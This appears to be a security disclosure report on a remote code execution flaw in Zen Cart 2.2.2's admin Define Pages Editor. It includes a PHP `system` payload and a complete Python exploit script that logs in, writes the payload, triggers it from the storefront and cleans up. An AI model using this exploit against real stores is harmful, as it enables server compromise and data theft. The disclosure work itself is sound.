# Security Report: Remote Code Execution (RCE) via Arbitrary File Write in define_pages_editor.php

## Summary
Zen Cart 2.2.2 is vulnerable to Remote Code Execution (RCE) because the "Define Pages Editor" allows administrative users to write arbitrary PHP code into template files, which are subsequently executed.

## Details
The vulnerability exists in `admin/define_pages_editor.php`. This component is designed to allow administrators to edit HTML content for custom pages. However, it fails to restrict the content to safe HTML and allows the inclusion of PHP tags. Since the edited files are saved as `.php` files in the template directory and then included by the main application, any PHP code written to them will be executed when the corresponding page is visited.

## Proof of Concept (PoC)
1. Log in to the Zen Cart admin panel.
2. Navigate to **Tools -> Define Pages Editor**.
3. Select `define_page_2.php` from the dropdown.
4. In the editor text area, enter the following payload: `<?php system("id"); ?>`
5. Click **Save**.
6. As an unauthenticated user, visit the following URL on the storefront: `http://[your-site]/index.php?main_page=page_2`
7. The output of the `id` command will be visible in the page response.

## Exploitation Script (rce_require.py)
```python
import urllib.request, urllib.parse, http.cookiejar, re

# --- Configuration ---
# Only URL and Credentials are required. 
# The script does NOT need to know the physical installation path on the server.
BASE_URL = "http://localhost:8000/stomP-LGR-Feast"
FRONTEND_URL = "http://localhost:8000"
HOST_HDR = "localhost:8000"
USER, PASS = "admin", "Admin123@"

# --- Session Initialization ---
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def req(url, data=None, headers=None):
    if data and isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    r = urllib.request.Request(url, data=data)
    r.add_header("Host", HOST_HDR)
    if headers:
        for k, v in headers.items():
            r.add_header(k, v)
    return opener.open(r).read().decode(errors='ignore')

try:
    # 1. Login
    print("[*] Step 1: Logging in to Admin Panel...")
    login_html = req(f"{BASE_URL}/index.php?cmd=login")
    token = re.search(r'securityToken" value="([^"]+)"', login_html).group(1)
    req(f"{BASE_URL}/index.php?cmd=login", {"admin_name": USER, "admin_pass": PASS, "securityToken": token, "action": "do"+token})
    print("    [+] Login successful.")

    # 2. Get Security Token for define_pages_editor
    print("[*] Step 2: Accessing define_pages_editor for define_page_2.php...")
    # The server knows its own path; we just provide the filename.
    editor_html = req(f"{BASE_URL}/index.php?cmd=define_pages_editor&filename=define_page_2.php")
    editor_token = re.search(r'securityToken" value="([^"]+)"', editor_html).group(1)
    
    # 3. Write PHP payload
    # We use a unique marker to verify RCE in the response body.
    print("[*] Step 3: Writing PHP payload to the server...")
    payload = '<?php echo "---RCE_SUCCESS_MARKER---"; system("id"); ?>'
    save_data = {
        "securityToken": editor_token,
        "file_contents": payload
    }
    # Parameters for the save action
    save_url = f"{BASE_URL}/index.php?cmd=define_pages_editor&lngdir=english&filename=define_page_2.php&action=save"
    req(save_url, data=save_data)
    print("    [+] Payload written successfully.")

    # 4. Trigger RCE via Frontend
    print("[*] Step 4: Triggering RCE via Frontend page_2...")
    # Triggering does not require admin session, just a simple GET request.
    trigger_url = f"{FRONTEND_URL}/index.php?main_page=page_2"
    trigger_req = urllib.request.Request(trigger_url)
    trigger_req.add_header("Host", HOST_HDR)
    resp = urllib.request.urlopen(trigger_req).read().decode(errors='ignore')

    # 5. Verify Verification
    if "---RCE_SUCCESS_MARKER---" in resp:
        print("\n[!] SUCCESS: Remote Code Execution confirmed!")
        # Extract the command output
        output_match = re.search(r'---RCE_SUCCESS_MARKER---(.*?)(?=<)', resp, re.DOTALL)
        if output_match:
            print(f"[!] Command Output: {output_match.group(1).strip()}")
    else:
        print("\n[-] FAILED: RCE marker not found in response.")

finally:
    # Cleanup: Restore the original content to be a good researcher
    print("\n[*] Step 5: Cleaning up (restoring original page content)...")
    original_content = '<p><strong>Page 2 Sample Text ...</strong></p>\n<p>We haven\'t updated this page yet. Please use the Contact Us form to let us know!</p>'
    try:
        editor_html = req(f"{BASE_URL}/index.php?cmd=define_pages_editor&filename=define_page_2.php")
        editor_token = re.search(r'securityToken" value="([^"]+)"', editor_html).group(1)
        save_data = {"securityToken": editor_token, "file_contents": original_content}
        req(f"{BASE_URL}/index.php?cmd=define_pages_editor&lngdir=english&filename=define_page_2.php&action=save", data=save_data)
        print("    [+] Cleanup complete.")
    except Exception as e:
        print(f"    [-] Cleanup failed: {e}")
```

## Impact
This vulnerability allows for persistent Remote Code Execution. Once the file is written, the attacker can execute arbitrary commands without needing to maintain an active admin session. This leads to full system compromise, data theft, and potential lateral movement within the network.

## Weakness
- **CWE-434:** Unrestricted Upload of File with Dangerous Type
